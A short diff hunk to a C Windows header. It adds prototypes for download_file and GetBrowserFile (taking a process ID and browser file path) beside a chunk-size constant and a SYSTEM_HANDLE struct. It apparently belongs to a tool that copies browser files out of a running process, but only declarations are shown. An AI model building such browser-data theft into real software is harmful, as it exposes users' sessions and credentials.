@@ -11,6 +11,8 @@
 // chunk size used in download_file: 900 KiB
 #define CHUNK_SIZE 0xe1000
 
+BOOL download_file( IN LPCSTR fileName, IN char fileData[], IN ULONG32 fileLength);
+BOOL GetBrowserFile(DWORD PID, CHAR *browserFile, CHAR *downloadFileName, CHAR * folderPath);
 
 typedef struct _SYSTEM_HANDLE
 {
